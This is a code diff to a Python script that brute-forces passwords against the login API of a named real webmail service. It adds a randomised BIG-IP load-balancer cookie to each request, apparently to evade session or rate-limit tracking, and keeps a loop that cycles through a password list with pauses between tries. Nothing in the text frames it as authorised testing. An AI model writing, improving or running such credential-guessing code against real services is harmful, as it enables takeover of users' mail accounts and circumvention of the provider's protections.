@@ -1,6 +1,9 @@
 import requests
 import argparse
 import time
+import random
+import string
+
 
 def parse_arguments():
     parser = argparse.ArgumentParser(
@@ -19,9 +22,18 @@ def parse_arguments():
 
     return user, passwords
 
+
+def generate_random_cookie_part(length=48):  # 64 is just an example length
+    """Generate a random cookie string part of a given length."""
+    characters = string.ascii_letters + string.digits + string.punctuation
+    cookie_part = ''.join(random.choice(characters) for i in range(length))
+    return cookie_part
+
+
 def attack(user, password):
     url = 'https://webmail.sasktel.net/api/bf/login/'
-
+    random_part = generate_random_cookie_part()
+    cookie_value = f"BIGipServer~C7~C7_PMAIL.0_IPv4_80_POOL=!YR/{random_part},"
     headers = {
         'Host': 'webmail.sasktel.net',
         'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
@@ -30,6 +42,7 @@ def attack(user, password):
         'Accept-Encoding': 'gzip, deflate, br',
         'Referer': 'https://webmail.sasktel.net/',
         'Content-Type': 'application/json',
+        'Cookie': cookie_value,
         'ADRUM': 'isAjax:true',
         'Sec-Fetch-Dest': 'empty',
         'Sec-Fetch-Mode': 'cors',
@@ -66,7 +79,7 @@ if __name__ == '__main__':
 
     print("Starting the attack...")
 
-    attempt_count = 0  # Initialize the counter
+    attempt_count = 0  
 
     for password in passwords:
         print(f"Trying password: {password}")
@@ -75,9 +88,9 @@ if __name__ == '__main__':
             break
 
         time.sleep(2)
-        attempt_count += 1  # Increment the counter
+        attempt_count += 1  
 
-        # If 10 attempts have been made, wait for 30 seconds and reset the counter
+       
         if attempt_count == 10:
             print("Waiting for 30 seconds...")
             time.sleep(30)
